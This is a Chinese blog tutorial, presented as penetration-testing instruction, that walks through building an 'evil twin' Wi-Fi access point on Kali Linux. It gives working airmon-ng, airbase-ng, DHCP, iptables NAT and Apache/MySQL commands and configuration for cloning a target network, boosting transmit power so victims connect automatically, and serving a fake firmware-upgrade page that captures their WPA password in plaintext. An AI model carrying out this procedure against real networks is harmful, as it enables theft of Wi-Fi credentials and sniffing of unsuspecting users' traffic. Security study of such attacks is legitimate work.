Kali 学徒：如何伪造一个Wi-Fi热点

M0tto1n • 2017年7月20日 • 工具 • 阅读 711

概述

“一个假冒的Wi-Fi 接入点（access point，以下简称为AP）是指在一个无线AP，在未获得本地网络管理员明确授权的情况下，被安装在安全网络上，添加者可能是善意的雇员，也可能是恶意的攻击者”—Wikipedia

假冒的无线 AP 通常又被称为流氓AP或邪恶AP。

渗透测试过程中常用的无线攻击工具有： aircrack-ng、Pyrit/CoWPAtty、Hashcat等，它们是较为有名的无线密码破解软件。不过使用它们进行Wi-Fi密码的破解存在一些弊端，要么速度太慢、要么消耗太多资源，如果我们能够在纯文本中直接读取Wi-Fi密码，省掉了破解WPA/2散列所需的时间、精力和资源，岂不是更好？

这个思路是可行的，如果能够建立一个假冒的无线AP，那么有可能会在几分钟内获得明文的WPA/2密码，不需要暴力破解，甚至不需要任何额外的硬件。至于什么情况下可以不需要无线适配器，下文中将做详细讲解。

在Kali Linux1.x版本中，我们创建一个虚假的无线 AP 并使用brctl工具配置网桥接口，但是在Kali Linux 2.0版本中，不再支持brctl，dhcp3-server也变为了isc-dhcp-server，这就导致在使用自动化脚本的时候，会出现很多问题，这一点一定要注意！

由于aircrack-ng和network-manager之间的一些冲突，本文会讲述一下如何解决这些冲突，与时俱进嘛。

本章中，我将手动演示并执行接下来的操作，读者也可以编写自己的脚本来自动化这些任务。

具体步骤

  • 首先，扫描周围的网络，获得目标 AP 的信息，使用airbase-ng创建一个与目标 AP 的名称和信道均相同的AP
  • 用户多次从原始的AP断开链接，系统会提示说：“网络已经断开，请重新连接BSSID（AP名称）”

当用户的客户端从任何AP断开后，它会向搜索周围网络中的AP信息，并向之前连接过的AP发送请求，因此 BISSID 不是一个障碍，你只需要使用相同的BISSID以伪造 AP。

  • 用户连接到了一个假冒的无线 AP，现在客户端已经联网了
  • 客户端将看到一个 Web 管理员提示：“请输入 WPA 密码，并升级路由器的固件”
  • 客户端输入密码后，会被重定向到一个加载页面，而此时，无线密码已经被存储到攻击者的数据库中了

*注意，如果用户的设备搜索周围网络的结果是之前没有保存过任何 AP ，甚至没有任何握手，那么这个时候你就需要破解WPA2-PSK密码了。

所需工具

使用到的硬件：

  • 一台笔记本电脑（英特尔酷睿i5处理器，4GB的RAM）
  • Alfa AWUS036NH 1W无线适配器
  • 华为3G无线上网卡（用于 Kali VM 的网络连接）

使用到的软件：

  • VMware workstation 12
  • Kali Linux 2.0 – Sana (模拟攻击方)
  • 华为3G无线上网卡（用于 Kali VM 的网络连接）
  • Airmon-ng, airodump-ng, airbase-ng, and aireplay-ng
  • Isc-dhcp-server
  • Iptables
  • Apache, mysql
  • Ubuntu 15.10 和Firefox Web浏览器 (模拟受害方)

工具安装

默认已经安装好了 Kali虚拟机，Kali上已经预安装了aircrack-ng套件、Apache、MySQL、iptables。

我们需要手动安装isc-dhcp-server，为客户端分配 IP 地址。

在 Kali Linux上安装isc-dhcp-server

在终端输入命令：

apt-get update

apt-get install isc-dhcp-server –y

上述命令将更新缓存，并安装最新版本的DHCP服务器到您的KaliLinux box中。

现在所有必需的工具都安装好了。我们需要配置Apache和DHCP服务器，以便无线 AP能够将IP地址分配给客户端/受害者，并确保客户端能够远程访问我们的Web页面。

配置Apache2 使“public_html”目录可供远程访问

默认情况下，Apache不允许开放远程连接的公共访问。所以我们需要做一些特殊配置。

在Ubuntu和其他基于Debian的发行版的操作系统中，Apache默认的Web目录是/var/www / public_html /。如果没有这样的目录，就创建一个。

打开终端，输入以下命令：

mkdir /var/www/public_html

这里需要注意，在Kali Linux系统中，apache 默认的Web目录是/var/www/html，所以需要把所有的rogue_AP.zip放到/var/www/html目录下。

现在你需要将public_html目录设置为能够远程访问，使用如下命令：

gedit /etc/apache2/mods-available/userdir.conf

打开userdir.conf并编辑其中的部分内容，如下图所示：

运行下列命令，使新的userdir.conf配置文件生效：

a2enmod userdir

配置 isc-dhcp-server

现在，我们需要定义 DHCP 服务器的IP范围和子网掩码。

在终端输入下列命令：

gedit /etc/dhcp/dhcpd.conf

在dhcpd.conf配置文件开头输入下列信息：

authoritative;

default-lease-time 600;

max-lease-time 7200;

subnet 192.168.1.0 netmask 255.255.255.0

{

option subnet-mask 255.255.255.0;

option broadcast-address 192.168.1.255;

option routers 192.168.1.1;

option domain-name-servers 8.8.8.8;

range 192.168.1.1 192.168.1.100;

}

（可选项）解决airmon-ng 和network-manager之间的冲突

在启动无线网卡的监听模式之前，让我们先修复一下airmon-ng和 network-manager 之间的冲突，这样做的好处是，我们可以在不杀掉 network-manager 进程或断开任何网站连接的情况下，就能够将无线适配器调成监控模式。

在终端输入以下命令：

gedit /etc/NetworkManager/NetworkManager.conf

将下列信息添加到NetworkManager.conf配置文件末尾：

[keyfile]

unmanaged-devices=interface-name:wlan0mon;interface-name:wlan1mon;interface-name:wlan2mon;interface-name:wlan3mon;interface-name:wlan4mon;interface-name:wlan5mon;interface-name:wlan6mon;interface-name:wlan7mon;interface-name:wlan8mon;interface-name:wlan9mon;interface-name:wlan10mon;interface-name:wlan11mon;interface-name:wlan12mon

结果如下图所示：

OK，问题已经解决了，以后在每次监听的时候，不必每次都那么麻烦了。

启动无线网卡

ifconfig wlan1 up     #你的网卡也可能是 wlan0 、wlan2 等

将无线适配器调成监听模式

airmon-ng start wlan1

执行完上述命令后，会收到一些输出，类似下图中所示的内容：

现在我们的网卡处于监听模式，没有任何network-manager的问题。你可以简单地用命令对网络进行监听：

airodump-ng wlan1mon

一旦你的目标 AP 出现在airodump-ng的输出窗口中，使用快捷键 CTRL-C将相关信息复制下来，尤其注意下来三项内容（以防万一，可以使用文本编辑器将它们保存下来）：

将alfa无线网卡的发射功率设置为最大值：1000mW

默认是100mW，如果系统安装时设置的地区为US，alfa的默认值可能是 1000 mW。Kali Linux 2.0（Sana）上操作时，可能会遇到一些问题，因此建议你将地区设置为US。命令如下所示：

ifconfig wlan1mon down   #Bring down the interface

iw reg set US    #Set region to be US

ifconfig wlan1mon up   #Bring the interface up

iwconfig wlan1mon   # Check tx-power, should be 30 dBm

之所以需要做上述调整，改变区域以使用适当的发射功率，是因为不同国家对无线设备有不同对法律许可，对其功率和频率都有一定的限制。

*提升无线网卡的发射频率的目的是，当你创建了Wi-Fi热点之后，不需要特别专门的靠近受害者，受害者的设备将自动连接到信号更强的热点上，即使不是物理上的最近距离。

开启假冒的无线AP

现在，我们使用airbase-ng创建一个虚假的 Wi-Fi 接入点，在终端输入一下命令：

airbase-ng  -e “rootsh3ll” -c 1 wlan1mon

默认情况下，airbase-ng会创建一个 (at0)的有线接口用来桥接／路由通过假冒AP的网络流量。可以使用 ifconfig命令查看它的相关信息：

为at0指派IP地址之前，我们首先应当划定一个 IP范围。

分配IP 和子网掩码

这里，我们为at0分配一个C类IP地址。网络地址是192.168.1.0，子网掩码是255.255.255.0 ，默认网关是192.168.1.1。我们将使用默认的以太网接口（如 eth0），通过它访问网络连接或虚拟机内部网络，所有客户端的流量也通过它进行传输。简而言之，就是允许受害者访问互联网，并允许我们（模拟的攻击者）嗅探受害者的流量。

这里我们需要使用 IPtables工具设置防火墙规则，过滤特定端口的流量。

首先，需要检查路由接口的IP地址，命令如下：

ip route

利用Iptables 实现 NAT功能

命令如下：

iptables –table nat –append POSTROUTING –out-interface eth0 -j MASQUERADE

iptables –append FORWARD –in-interface at0 -j ACCEPT

启用转发

echo 1 > /proc/sys/net/ipv4/ip_forward

*1：代表允许；0:代表禁止。

现在，我们不妨先把它设为0，在获取到 WPA 密码之前不提供Internet访问。

截止到目前位置，我们已经启用了无线AP，规则也已生效。接下来，我们需要启动 DHCP 服务，允许创建的假冒的AP向客户端分配IP地址。

设置 DHCP 服务器

首先，我们需要告诉 DHCP 服务器我们之前创建的相关文件（定义了IP类、子网掩码和网络范围）的位置。

启动 dhcpd监听器

在终端输入以下命令：

dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0

*-cf后边跟dhcod.conf文件；-pf后边跟eth0.pid文件（根据文件的实际情况进行填写）

输出结果，类似下图所示：

这个过程中，如果遇到任何DHCP 相关的问题，可以先杀掉运行中的dhcp进程（killall dhcpd isc-dhcp-server），然后重新启动。

启动相关服务

使用如下命令启动dhcp server、Apache和MySQL服务：

service isc-dhcp-server start

/etc/init.d/apache2 start

/etc/init.d/mysql start

OK，现在我们的AP已经可以正常工作了。
